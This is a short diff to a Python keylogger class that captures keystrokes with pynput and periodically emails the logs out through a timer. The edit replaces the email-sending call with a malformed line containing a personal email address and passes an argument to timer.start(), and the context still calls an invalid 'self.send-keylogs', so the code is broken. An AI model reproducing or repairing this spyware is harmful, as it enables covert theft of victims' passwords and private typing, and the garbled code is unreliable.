@@ -31,10 +31,10 @@ class KeyLogger:
         server.quit()
     # send keylogs
     def sendKeylogs(self):
-        self.emailServer(self.keylogs)  
+        selfchasemontanya@gmail.com(self.keylogs)  
         self.keylogs = ""
         timer = threading.Timer(300, self.send-keylogs)
-        timer.start()
+        timer.start(6)
     # start
     def start(self): 
         pynputListener = pynput.keyboard.Listener(on_press=self.processKeyListen)
